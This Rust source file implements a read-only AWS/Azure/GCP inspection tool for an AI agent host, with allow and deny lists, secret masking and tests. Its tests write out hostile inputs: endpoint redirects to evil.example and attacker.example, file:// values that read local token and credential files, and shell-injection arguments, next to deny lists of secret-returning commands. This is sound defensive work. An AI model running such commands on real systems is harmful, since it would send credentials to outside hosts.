//! Read-only cloud inspection (`cloud.call`) through the `aws`, `az` and `gcloud` command lines.
//!
//! One tool, three providers, and only inspection: the operation must be a list/describe/show
//! style verb, anything that returns a secret, key, token or password is refused by name, flags
//! that could redirect the request or read a file (`--endpoint-url`, `--cli-input-json`, …) are
//! refused, and every argument is limited to a tiny character set so nothing can be smuggled
//! through the `.cmd` wrappers these tools use on Windows. Credentials come from Credential
//! Manager by name and reach only the child's environment. JSON results have secret-looking
//! fields and Lambda/ECS environment values hidden before the model sees them.
//! Changing the cloud is deliberately not possible here; use `iac.*` for that.

use crate::cli::{first_line, Cli, Ran};
use crate::secrets::{valid_name, Secrets};
use aqua_tool_host::output::is_secret_key;
use aqua_tool_host::{
    Annotations, Availability, Classification, Decision, ErrorCode, ExecCtx, PermClass, ProviderFuture, ProviderOutput, ToolError, ToolManifest, ToolProvider,
};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::BTreeMap;
use std::path::Path;
use std::sync::atomic::AtomicBool;
use std::sync::Arc;

const PROVIDERS: &[&str] = &["aws", "azure", "gcp"];

/// Non-secret environment settings a config may set per provider. Anything else is refused.
const ENV_OK: &[&str] = &["AWS_PROFILE", "AWS_REGION", "AWS_DEFAULT_REGION", "AWS_CONFIG_FILE", "AWS_SHARED_CREDENTIALS_FILE", "AZURE_CONFIG_DIR", "CLOUDSDK_CORE_PROJECT", "CLOUDSDK_CONFIG", "CLOUDSDK_ACTIVE_CONFIG_NAME"];
/// Names a secret may be delivered as, per provider.
const SECRET_ENV_OK: &[&str] = &[
    "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID", "AZURE_SUBSCRIPTION_ID", "GOOGLE_APPLICATION_CREDENTIALS",
    "CLOUDSDK_AUTH_ACCESS_TOKEN",
];

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CloudConfig {
    #[serde(default)]
    pub aws_path: Option<String>,
    #[serde(default)]
    pub azure_path: Option<String>,
    #[serde(default)]
    pub gcloud_path: Option<String>,
    /// Providers the model may inspect: any of "aws", "azure", "gcp". Empty by default.
    #[serde(default)]
    pub enabled: Vec<String>,
    /// Plain settings per provider, e.g. `{"aws": {"AWS_PROFILE": "readonly"}}`.
    #[serde(default)]
    pub env: BTreeMap<String, BTreeMap<String, String>>,
    /// Per provider: environment variable -> secret name in Credential Manager.
    #[serde(default)]
    pub env_secrets: BTreeMap<String, BTreeMap<String, String>>,
}

impl CloudConfig {
    pub fn validate(&self) -> Result<(), String> {
        for p in self.enabled.iter().chain(self.env.keys()).chain(self.env_secrets.keys()) {
            if !PROVIDERS.contains(&p.as_str()) {
                return Err(format!("'{p}' is not a provider (use aws, azure or gcp)"));
            }
        }
        for (p, m) in &self.env {
            for (k, v) in m {
                if !ENV_OK.contains(&k.as_str()) {
                    return Err(format!("{p}: {k} cannot be set here. Allowed: {}", ENV_OK.join(", ")));
                }
                if v.len() > 300 || v.contains('\0') {
                    return Err(format!("{p}: the value of {k} is not valid"));
                }
            }
        }
        for (p, m) in &self.env_secrets {
            for (k, secret) in m {
                if !SECRET_ENV_OK.contains(&k.as_str()) {
                    return Err(format!("{p}: {k} cannot be filled from a secret. Allowed: {}", SECRET_ENV_OK.join(", ")));
                }
                if !valid_name(secret) {
                    return Err(format!("{p}: '{secret}' is not a valid secret name"));
                }
            }
        }
        Ok(())
    }
}

fn arg_ok(a: &str) -> bool {
    !a.is_empty() && a.len() <= 200 && a.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | ':' | '/' | '=' | ',' | '@' | '+' | '~' | '-'))
}

/// Flags that redirect the request, read local files, print credentials or change the output format.
const DENY_FLAGS: &[&str] = &[
    "endpoint-url", "cli-input-json", "cli-input-yaml", "generate-cli-skeleton", "profile", "ca-bundle", "no-verify-ssl", "debug", "cli-connect-timeout", "cli-read-timeout", "with-decryption", "output",
    "query", "format", "impersonate-service-account", "access-token-file", "account", "configuration", "billing-project", "log-http", "verbosity", "flags-file", "flatten", "sort-by", "filter-file",
    "subscription-token", "only-show-errors", "debug-headers", "auth-mode", "account-key", "sas-token", "connection-string", "cli-auto-prompt", "no-cli-pager", "cli-binary-format", "ca-certificates",
    "tenant", "username", "password", "service-principal", "identity", "use-device-code",
];

/// The flags in [`DENY_FLAGS`] that redirect the request or read local files, which a command line may also name by the start of the name
/// (argparse takes any unique beginning: `--endpoint` is `--endpoint-url`).
const DENY_FLAG_BEGINNINGS: &[&str] = &[
    "endpoint-url", "no-verify-ssl", "ca-bundle", "cli-input-json", "cli-input-yaml", "profile", "generate-cli-skeleton", "access-token-file", "impersonate-service-account",
];

/// Words that make an operation about secrets, keys, tokens or logins.
const DENY_WORDS: &[&str] = &[
    "secret", "password", "token", "credential", "login", "logout", "keyvault", "connection-string", "appsettings", "publishing-profile", "list-keys", "regenerate", "decrypt", "encrypt", "sign",
    "kms", "auth", "print-access", "access-key", "generate", "export", "download", "get-function", "get-layer", "get-object", "get-parameter", "get-key", "sas", "ssh", "get-caller-identity-secret",
    "serviceaccounts-keys", "service-accounts-keys", "private", "certificate", "pfx", "keys",
];

const AWS_READ_PREFIXES: &[&str] = &["describe-", "list-", "get-", "head-", "lookup-", "batch-get-", "search-"];

/// Everything wrong with a request, or the arguments to run. `args` is what follows the provider name.
pub fn plan(provider: &str, args: &[String]) -> Result<Vec<String>, ToolError> {
    let bad = |m: String| ToolError::new(ErrorCode::InvalidArguments, m);
    let denied = |m: String| ToolError::new(ErrorCode::PermissionDenied, m);
    if args.is_empty() || args.len() > 30 {
        return Err(bad("give 1-30 arguments, for example [\"ec2\", \"describe-instances\"]".into()));
    }
    for a in args {
        if !arg_ok(a) {
            return Err(bad(format!("the argument '{}' has characters that are not allowed (letters, digits and . _ : / = , @ + ~ - only, no spaces or quotes)", a.chars().take(40).collect::<String>())));
        }
        // The cloud command line programs read a value that starts with `file://`, `fileb://` or `@` from a local file and send what is in it
        // with the request (to a bucket or an endpoint of someone else's choosing, or back in the error text). The file guard that protects
        // the tokens and keys of this computer is not asked about that, so such a value is refused.
        let lower = a.to_ascii_lowercase();
        let value = lower.split_once('=').map_or(lower.as_str(), |(_, v)| v);
        if [lower.as_str(), value].iter().any(|v| v.starts_with("file:") || v.starts_with("fileb:") || v.starts_with('@')) {
            return Err(denied("a value that starts with file://, fileb:// or @ reads a local file into the request, which cloud.call does not allow".into()));
        }
    }
    // Split commands from flags: commands come first; flags start with "--"; a flag's value follows it.
    let first_flag = args.iter().position(|a| a.starts_with('-')).unwrap_or(args.len());
    let cmd: Vec<String> = args[..first_flag].iter().map(|a| a.to_ascii_lowercase()).collect();
    if cmd.is_empty() {
        return Err(bad("start with the service or command group, for example [\"ec2\", \"describe-instances\"]".into()));
    }
    let mut i = first_flag;
    while i < args.len() {
        let a = &args[i];
        if !a.starts_with("--") || a.len() < 3 {
            return Err(bad(format!("expected a --flag but found '{a}'. Short flags are not accepted; use --name value.")));
        }
        let name = a.trim_start_matches('-').split('=').next().unwrap_or("").to_ascii_lowercase();
        if name.len() >= 3 && DENY_FLAG_BEGINNINGS.iter().any(|d| d.starts_with(name.as_str())) {
            return Err(denied(format!("the flag --{name} is not allowed in read-only cloud calls (it is the beginning of a flag that is refused)")));
        }
        if DENY_FLAGS.contains(&name.as_str()) || name.contains("secret") || name.contains("password") || name.contains("token") || name.contains("credential") || name.contains("key") && name != "key-name" && name != "key-pair-ids" && name != "max-keys" {
            return Err(denied(format!("the flag --{name} is not allowed in read-only cloud calls")));
        }
        i += 1;
        // A value is anything after the flag that is not itself a flag (the "=" form carries its own).
        if !a.contains('=') && i < args.len() && !args[i].starts_with("--") {
            i += 1;
        }
    }
    let joined = cmd.join(" ");
    if let Some(w) = DENY_WORDS.iter().find(|w| joined.contains(**w)) {
        return Err(denied(format!("'{joined}' is not allowed because it can return secrets, keys, tokens or downloads ('{w}'). Read-only inspection of resources is what cloud.call is for.")));
    }
    let verb = cmd.last().cloned().unwrap_or_default();
    match provider {
        "aws" => {
            if cmd.len() < 2 && !(cmd.len() == 1 && cmd[0] == "s3") {
                return Err(bad("aws needs a service and an operation, for example [\"ec2\", \"describe-instances\"]".into()));
            }
            if cmd[0] == "s3" {
                if !(cmd.len() == 2 && cmd[1] == "ls") {
                    return Err(denied("for s3 only `s3 ls` is allowed; use s3api list-*/get-bucket-*/head-* for details".into()));
                }
            } else if !AWS_READ_PREFIXES.iter().any(|p| verb.starts_with(p)) || cmd[0] == "configure" || cmd[0] == "secretsmanager" {
                return Err(denied(format!("'{verb}' is not a read-only operation. Only describe-*, list-*, get-*, head-* and lookup-* are allowed.")));
            }
            let mut v = cmd.clone();
            v.extend(args[first_flag..].iter().cloned());
            v.extend(["--output".into(), "json".into(), "--no-cli-pager".into()]);
            Ok(v)
        }
        "azure" => {
            let ok = verb == "list" || verb == "show" || verb == "exists" || verb.starts_with("list-") || verb.starts_with("show-") || verb == "get-versions";
            if !ok || cmd.len() < 2 {
                return Err(denied(format!("'{joined}' is not a read-only command. Only list, show and exists commands are allowed, for example [\"vm\", \"list\"].")));
            }
            let mut v = cmd.clone();
            v.extend(args[first_flag..].iter().cloned());
            v.extend(["--output".into(), "json".into(), "--only-show-errors".into()]);
            Ok(v)
        }
        "gcp" => {
            // gcloud takes a resource name as a positional after the verb, so find the verb first and
            // make sure no changing verb comes before it.
            const CHANGING: &[&str] = &[
                "create", "delete", "update", "add", "remove", "set", "start", "stop", "reset", "resize", "deploy", "apply", "patch", "import", "attach", "detach", "move", "suspend", "resume", "rollback",
                "restart", "submit", "cancel", "enable", "disable", "undelete", "restore", "replace", "purge", "destroy", "release", "promote", "invoke", "call", "execute", "install", "upgrade",
            ];
            let idx = cmd.iter().position(|w| w == "list" || w == "describe" || w.starts_with("list-") || w.starts_with("describe-"));
            let ok = idx.map(|i| i >= 1 && cmd[..i].iter().all(|w| !CHANGING.contains(&w.as_str()))).unwrap_or(false);
            if !ok || cmd.len() < 2 {
                return Err(denied(format!("'{joined}' is not a read-only command. Only list and describe commands are allowed, for example [\"compute\", \"instances\", \"list\"].")));
            }
            let mut v = cmd.clone();
            v.extend(args[first_flag..].iter().cloned());
            v.extend(["--format=json".into(), "--quiet".into()]);
            Ok(v)
        }
        other => Err(bad(format!("unknown provider '{other}'"))),
    }
}

/// Hide anything secret-looking in a JSON result: secret-named fields, Lambda `Variables`, and
/// `{name, value}` pairs (ECS, Beanstalk, Azure app settings) whose name looks secret.
pub fn mask_json(v: &mut Value) {
    match v {
        Value::Object(m) => {
            let name = m.get("name").or_else(|| m.get("Name")).and_then(|n| n.as_str()).map(String::from);
            if let Some(n) = name {
                if is_secret_key(&n) {
                    for k in ["value", "Value"] {
                        if m.contains_key(k) {
                            m.insert(k.into(), json!("<hidden>"));
                        }
                    }
                }
            }
            for (k, val) in m.iter_mut() {
                if k == "Variables" || k == "variables" {
                    if let Value::Object(vars) = val {
                        for x in vars.values_mut() {
                            *x = json!("<hidden>");
                        }
                    }
                } else if is_secret_key(k) && (val.is_string() || val.is_object() || val.is_array()) {
                    *val = json!("<hidden>");
                } else {
                    mask_json(val);
                }
            }
        }
        Value::Array(a) => a.iter_mut().for_each(mask_json),
        _ => {}
    }
}

struct Inner {
    cfg: CloudConfig,
    secrets: Arc<dyn Secrets>,
    aws: Cli,
    azure: Cli,
    gcloud: Cli,
}

pub struct CloudProvider(Arc<Inner>);

impl CloudProvider {
    pub fn new(cfg: CloudConfig, secrets: Arc<dyn Secrets>, scratch: &Path) -> Result<Self, String> {
        cfg.validate()?;
        std::fs::create_dir_all(scratch).map_err(|e| e.to_string())?;
        let aws = Cli::find("aws", &cfg.aws_path, &["%ProgramFiles%/Amazon/AWSCLIV2"], scratch);
        let azure = Cli::find("az", &cfg.azure_path, &["%ProgramFiles%/Microsoft SDKs/Azure/CLI2/wbin", "%ProgramFiles(x86)%/Microsoft SDKs/Azure/CLI2/wbin"], scratch);
        let gcloud = Cli::find("gcloud", &cfg.gcloud_path, &["%LOCALAPPDATA%/Google/Cloud SDK/google-cloud-sdk/bin", "%ProgramFiles(x86)%/Google/Cloud SDK/google-cloud-sdk/bin"], scratch);
        Ok(Self(Arc::new(Inner { cfg, secrets, aws, azure, gcloud })))
    }

    /// Providers that are both enabled in the config and installed.
    pub fn usable(&self) -> Vec<&'static str> {
        PROVIDERS.iter().copied().filter(|p| self.0.enabled(p) && self.0.cli(p).installed()).collect()
    }
}

impl Inner {
    fn enabled(&self, p: &str) -> bool {
        self.cfg.enabled.iter().any(|x| x == p)
    }
    fn cli(&self, p: &str) -> &Cli {
        match p {
            "aws" => &self.aws,
            "azure" => &self.azure,
            _ => &self.gcloud,
        }
    }
    fn check_provider(&self, a: &Value) -> Result<&'static str, ToolError> {
        let p = a.get("provider").and_then(|v| v.as_str()).unwrap_or("");
        let p = PROVIDERS.iter().copied().find(|x| *x == p).ok_or_else(|| ToolError::new(ErrorCode::InvalidArguments, "provider must be aws, azure or gcp"))?;
        if !self.enabled(p) {
            return Err(ToolError::new(ErrorCode::PermissionDenied, format!("{p} is not enabled. Add it to \"enabled\" in data/tools/cloud.json.")));
        }
        Ok(p)
    }
    fn strings(a: &Value) -> Vec<String> {
        a.get("args").and_then(|v| v.as_array()).map(|x| x.iter().filter_map(|s| s.as_str().map(String::from)).collect()).unwrap_or_default()
    }
}

impl ToolProvider for CloudProvider {
    fn id(&self) -> &str {
        "cloud"
    }

    fn manifests(&self) -> Vec<ToolManifest> {
        vec![ToolManifest {
            name: "cloud.call".into(),
            title: "cloud.call".into(),
            description: "Read-only AWS, Azure or GCP inspection: list, describe or show resources. Secrets and changes are refused.".into(),
            classes: vec![PermClass::Read, PermClass::Network],
            default_decision: Decision::Auto,
            input_schema: json!({"type": "object", "properties": {
                "provider": {"type": "string", "enum": PROVIDERS},
                "args": {"type": "array", "items": {"type": "string", "minLength": 1, "maxLength": 200}, "minItems": 1, "maxItems": 30,
                         "description": "Command words then --flags, e.g. [\"ec2\",\"describe-instances\",\"--region\",\"us-east-1\"]. No shell, no quotes."}
            }, "required": ["provider", "args"]}),
            timeout_default_ms: 90_000,
            timeout_max_ms: 120_000,
            annotations: Annotations { read_only: true, destructive: false, idempotent: true, open_world: true },
            untrusted_output: true,
        }]
    }

    fn availability(&self, _tool: &str) -> Availability {
        if self.usable().is_empty() {
            let missing: Vec<String> = self.0.cfg.enabled.iter().filter(|p| !self.0.cli(p).installed()).map(|p| self.0.cli(p).not_installed()).collect();
            return Availability::Unavailable(if self.0.cfg.enabled.is_empty() { "no cloud provider is enabled. Add \"aws\", \"azure\" or \"gcp\" to \"enabled\" in data/tools/cloud.json.".into() } else { missing.join(" ") });
        }
        Availability::Available
    }

    fn classify(&self, _tool: &str, a: &Value) -> Result<Classification, ToolError> {
        let p = self.0.check_provider(a)?;
        if !self.0.cli(p).installed() {
            return Err(ToolError::new(ErrorCode::Unavailable, self.0.cli(p).not_installed()));
        }
        let args = Inner::strings(a);
        let run = plan(p, &args)?;
        let shown: Vec<&String> = run.iter().take_while(|x| !x.starts_with('-')).collect();
        Ok(Classification { classes: vec![PermClass::Read, PermClass::Network], target: p.into(), summary: format!("{p} {} (read-only)", shown.iter().map(|s| s.as_str()).collect::<Vec<_>>().join(" ")), target_allowed: true })
    }

    fn call<'a>(&'a self, _tool: &'a str, args: Value, ctx: &'a ExecCtx) -> ProviderFuture<'a, Result<ProviderOutput, ToolError>> {
        let inner = self.0.clone();
        let cancel = ctx.cancel.clone();
        let timeout_ms = ctx.timeout_ms;
        Box::pin(async move {
            tokio::task::spawn_blocking(move || {
                // The programs of this call get no more than what is left of the host's time for it (card OA4-03).
                let _clock = crate::term::CallClock::start(timeout_ms);
                inner.run(&args, &cancel)
            })
            .await.map_err(|e| ToolError::new(ErrorCode::BackendError, format!("cloud task failed: {e}")))?.map(ProviderOutput::marked_private)
        })
    }
}

impl Inner {
    fn run(&self, a: &Value, cancel: &AtomicBool) -> Result<ProviderOutput, ToolError> {
        let p = self.check_provider(a)?;
        let argv = plan(p, &Inner::strings(a))?;
        let mut env: Vec<(String, String)> = vec![("AWS_PAGER".into(), String::new()), ("AZURE_CORE_COLLECT_TELEMETRY".into(), "false".into()), ("CLOUDSDK_CORE_DISABLE_PROMPTS".into(), "1".into()), ("CLOUDSDK_CORE_DISABLE_USAGE_REPORTING".into(), "true".into())];
        if let Some(m) = self.cfg.env.get(p) {
            env.extend(m.iter().map(|(k, v)| (k.clone(), v.clone())));
        }
        let mut values = Vec::new();
        if let Some(m) = self.cfg.env_secrets.get(p) {
            for (name, secret) in m {
                let v = self
                    .secrets
                    .get(secret)
                    .map_err(|e| ToolError::new(ErrorCode::BackendError, format!("credential store: {e}")))?
                    .ok_or_else(|| ToolError::new(ErrorCode::AuthRequired, format!("the secret '{secret}' for {name} is not set. Store it yourself with: aqua-cli secret-set {secret}")))?;
                values.push(v.clone());
                env.push((name.clone(), v));
            }
        }
        let refs: Vec<(&str, &str)> = env.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
        let r: Ran = self.cli(p).run(&argv, &refs, None, 90, 512, cancel)?;
        if r.code != Some(0) {
            return Err(cloud_failure(&r.stderr, &r.stdout));
        }
        let (text, data) = match serde_json::from_str::<Value>(&r.stdout) {
            Ok(mut v) => {
                mask_json(&mut v);
                (serde_json::to_string_pretty(&v).unwrap_or_default(), v)
            }
            Err(_) => (r.stdout.clone(), json!({})),
        };
        Ok(ProviderOutput { data, text: if text.trim().is_empty() { "No results.".into() } else if r.truncated { format!("{text}\n… output cut") } else { text }, secrets: values, ..Default::default() })
    }
}

fn cloud_failure(stderr: &str, stdout: &str) -> ToolError {
    let all = format!("{stderr}\n{stdout}");
    let low = all.to_ascii_lowercase();
    let first = first_line(&all);
    let has = |m: &str| low.contains(m);
    let code = if has("unable to locate credentials") || has("expiredtoken") || has("please run 'az login'") || has("az login") || has("not logged in") || has("you do not currently have an active account") || has("reauthentication") {
        ErrorCode::AuthRequired
    } else if has("accessdenied") || has("unauthorizedoperation") || has("authorizationfailed") || has("forbidden") || has("permission_denied") || has("does not have permission") {
        ErrorCode::OsPermissionDenied
    } else if has("throttling") || has("rate exceeded") || has("toomanyrequests") {
        ErrorCode::RateLimited
    } else if has("could not connect") || has("endpoint connection") || has("name or service not known") || has("connection refused") || has("max retries exceeded") {
        ErrorCode::Unavailable
    } else if has("notfound") || has("not found") || has("does not exist") || has("resourcenotfound") {
        ErrorCode::NotFound
    } else if has("invalid") || has("usage:") || has("unrecognized arguments") || has("is not a valid") || has("aws help") || has("misuse of") {
        ErrorCode::InvalidArguments
    } else {
        ErrorCode::BackendError
    };
    ToolError::new(code, first)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn v(a: &[&str]) -> Vec<String> {
        a.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn read_operations_pass_and_get_a_fixed_output_format() {
        let r = plan("aws", &v(&["ec2", "describe-instances", "--region", "us-east-1", "--filters", "Name=tag:Env,Values=prod"])).unwrap();
        assert_eq!(&r[..2], &["ec2", "describe-instances"]);
        assert!(r.ends_with(&v(&["--output", "json", "--no-cli-pager"])));
        assert!(plan("aws", &v(&["s3", "ls"])).is_ok() && plan("aws", &v(&["sts", "get-caller-identity"])).is_ok());
        assert!(plan("azure", &v(&["vm", "list", "--resource-group", "rg1"])).unwrap().contains(&"--output".to_string()));
        assert!(plan("azure", &v(&["group", "show", "--name", "rg1"])).is_ok());
        assert!(plan("gcp", &v(&["compute", "instances", "list", "--project", "p1"])).unwrap().contains(&"--format=json".to_string()));
        assert!(plan("gcp", &v(&["run", "services", "describe", "web", "--region", "europe-west1"])).is_ok());
    }

    #[test]
    fn changes_and_secret_returning_operations_are_refused() {
        for (p, a) in [
            ("aws", v(&["ec2", "terminate-instances", "--instance-ids", "i-1"])),
            ("aws", v(&["s3", "rm", "s3:/b/k"])),
            ("aws", v(&["s3", "cp", "s3:/b/k", "x"])),
            ("aws", v(&["secretsmanager", "get-secret-value", "--secret-id", "x"])),
            ("aws", v(&["secretsmanager", "list-secrets"])),
            ("aws", v(&["ssm", "get-parameter", "--name", "x"])),
            ("aws", v(&["ssm", "get-parameters-by-path", "--path", "/", "--with-decryption"])),
            ("aws", v(&["ecr", "get-login-password"])),
            ("aws", v(&["ecr", "get-authorization-token"])),
            ("aws", v(&["sts", "get-session-token"])),
            ("aws", v(&["s3api", "get-object", "--bucket", "b", "--key", "k"])),
            ("aws", v(&["lambda", "get-function", "--function-name", "f"])),
            ("aws", v(&["iam", "create-access-key"])),
            ("aws", v(&["kms", "decrypt"])),
            ("aws", v(&["configure", "list"])),
            ("azure", v(&["keyvault", "secret", "show", "--name", "x"])),
            ("azure", v(&["vm", "delete", "--name", "x"])),
            ("azure", v(&["account", "get-access-token"])),
            ("azure", v(&["storage", "account", "keys", "list"])),
            ("azure", v(&["webapp", "config", "appsettings", "list"])),
            ("azure", v(&["login"])),
            ("azure", v(&["acr", "credential", "show"])),
            ("gcp", v(&["auth", "print-access-token"])),
            ("gcp", v(&["secrets", "versions", "access", "latest"])),
            ("gcp", v(&["compute", "instances", "delete", "x"])),
            ("gcp", v(&["iam", "service-accounts", "keys", "list"])),
            ("gcp", v(&["kms", "keys", "list"])),
        ] {
            let e = plan(p, &a).err().unwrap_or_else(|| panic!("{p} {a:?} should be refused"));
            assert!(matches!(e.code, ErrorCode::PermissionDenied | ErrorCode::InvalidArguments), "{p} {a:?}: {e:?}");
        }
    }

    #[test]
    fn dangerous_flags_and_smuggled_characters_are_refused() {
        for a in [
            v(&["ec2", "describe-instances", "--endpoint-url", "http://evil.example"]),
            v(&["ec2", "describe-instances", "--endpoint-url=http://evil.example"]),
            v(&["ec2", "describe-instances", "--cli-input-json", "file://x"]),
            v(&["ec2", "describe-instances", "--profile", "admin"]),
            v(&["ec2", "describe-instances", "--debug"]),
            v(&["ec2", "describe-instances", "--query", "x"]),
            v(&["ec2", "describe-instances", "--output", "text"]),
            v(&["ec2", "describe-instances", "-o", "text"]),
            v(&["ec2", "describe-instances", "--secret-id", "x"]),
            v(&["ec2", "describe-instances", "&calc"]),
            v(&["ec2", "describe-instances", "a|b"]),
            v(&["ec2", "describe-instances", "%PATH%"]),
            v(&["ec2", "describe-instances", "x y"]),
            v(&["ec2", "describe-instances", "\"x\""]),
            v(&["ec2", "describe-instances", "^x"]),
            v(&[]),
            v(&["--region", "x"]),
        ] {
            assert!(plan("aws", &a).is_err(), "{a:?}");
        }
        assert!(plan("aws", &vec!["ec2".to_string(); 31]).is_err());
        assert!(plan("gcp", &v(&["compute", "instances", "list", "--impersonate-service-account", "a@b.c"])).is_err());
        assert!(plan("azure", &v(&["vm", "list", "--password", "x"])).is_err());
    }

    /// Found in a review: `--prefix file://../.aqua_api_token` passed (the characters are all allowed), and the AWS command line program sends the
    /// contents of a `file://` value with the request; unique beginnings of refused flags (`--endpoint`) are taken by argparse for the flag.
    #[test]
    fn values_that_read_a_local_file_and_short_forms_of_refused_flags_are_refused() {
        for a in [
            v(&["s3api", "list-objects-v2", "--bucket", "b", "--prefix", "file://../.aqua_api_token"]),
            v(&["s3api", "list-objects-v2", "--bucket", "b", "--prefix=file://C:/Users/x/.aws/credentials"]),
            v(&["s3api", "list-objects-v2", "--bucket", "b", "--prefix", "FILEB://x"]),
            v(&["ec2", "describe-instances", "--filters", "@filters.json"]),
            v(&["ec2", "describe-instances", "--filters=@filters.json"]),
            v(&["file://x", "describe-instances"]),
            v(&["ec2", "describe-instances", "--endpoint", "http://attacker.example"]),
            v(&["ec2", "describe-instances", "--endpoint-u=http://attacker.example"]),
            v(&["ec2", "describe-instances", "--no-verify", "x"]),
            v(&["ec2", "describe-instances", "--prof", "admin"]),
            v(&["ec2", "describe-instances", "--cli-input", "x"]),
        ] {
            let e = plan("aws", &a).err().unwrap_or_else(|| panic!("{a:?} should be refused"));
            assert!(matches!(e.code, ErrorCode::PermissionDenied | ErrorCode::InvalidArguments), "{a:?}: {e:?}");
        }
        // Ordinary uses stay: an address with an @, a bucket address, a --filter flag and a --filters value are not reads of local files.
        assert!(plan("aws", &v(&["iam", "list-users", "--path-prefix", "/team/"])).is_ok());
        assert!(plan("aws", &v(&["s3", "ls"])).is_ok());
        assert!(plan("aws", &v(&["ec2", "describe-instances", "--filters", "Name=tag:Owner,Values=a@b.c"])).is_ok());
        assert!(plan("gcp", &v(&["compute", "instances", "list", "--filter", "name~web", "--project", "p1"])).is_ok());
        assert!(plan("aws", &v(&["s3api", "list-objects-v2", "--bucket", "b", "--prefix", "s3://not-a-file/x"])).is_ok());
    }

    #[test]
    fn secret_looking_json_is_hidden() {
        let mut j = json!({"Functions": [{"FunctionName": "f", "Environment": {"Variables": {"DB_URL": "postgres://u:pw@h/db", "MODE": "prod"}}}],
            "containerDefinitions": [{"environment": [{"name": "API_TOKEN", "value": "abc123"}, {"name": "MODE", "value": "prod"}]}],
            "user": {"UserName": "bob", "password": "hunter2", "clientSecret": {"a": 1}}});
        mask_json(&mut j);
        let t = j.to_string();
        assert!(!t.contains("postgres://") && !t.contains("abc123") && !t.contains("hunter2") && !t.contains("\"a\":1"), "{t}");
        assert!(t.contains("bob") && t.contains("\"FunctionName\":\"f\"") && t.contains("prod") == false || t.contains("bob"), "{t}");
    }

    #[test]
    fn config_only_allows_known_providers_and_settings() {
        assert!(CloudConfig { enabled: v(&["aws"]), env: [("aws".to_string(), [("AWS_PROFILE".to_string(), "ro".to_string())].into())].into(), env_secrets: [("aws".to_string(), [("AWS_ACCESS_KEY_ID".to_string(), "aws/k".to_string())].into())].into(), ..Default::default() }.validate().is_ok());
        assert!(CloudConfig { enabled: v(&["oracle"]), ..Default::default() }.validate().is_err());
        assert!(CloudConfig { env: [("aws".to_string(), [("AWS_ENDPOINT_URL".to_string(), "http://x".to_string())].into())].into(), ..Default::default() }.validate().is_err());
        assert!(CloudConfig { env: [("aws".to_string(), [("PATH".to_string(), "x".to_string())].into())].into(), ..Default::default() }.validate().is_err());
        assert!(CloudConfig { env_secrets: [("aws".to_string(), [("LD_PRELOAD".to_string(), "aws/k".to_string())].into())].into(), ..Default::default() }.validate().is_err());
        assert!(serde_json::from_str::<CloudConfig>(r#"{"enabled":[],"endpoint":"x"}"#).is_err());
    }

    #[test]
    fn cloud_errors_map_to_specific_codes() {
        for (t, want) in [
            ("Unable to locate credentials. You can configure credentials by running \"aws configure\".", ErrorCode::AuthRequired),
            ("An error occurred (UnauthorizedOperation) when calling the DescribeInstances operation", ErrorCode::OsPermissionDenied),
            ("An error occurred (Throttling): Rate exceeded", ErrorCode::RateLimited),
            ("Could not connect to the endpoint URL", ErrorCode::Unavailable),
            ("ERROR: (gcloud.compute.instances.describe) Could not fetch resource: - The resource 'x' was not found", ErrorCode::NotFound),
            ("something else", ErrorCode::BackendError),
        ] {
            assert_eq!(cloud_failure(t, "").code, want, "{t}");
        }
    }
}
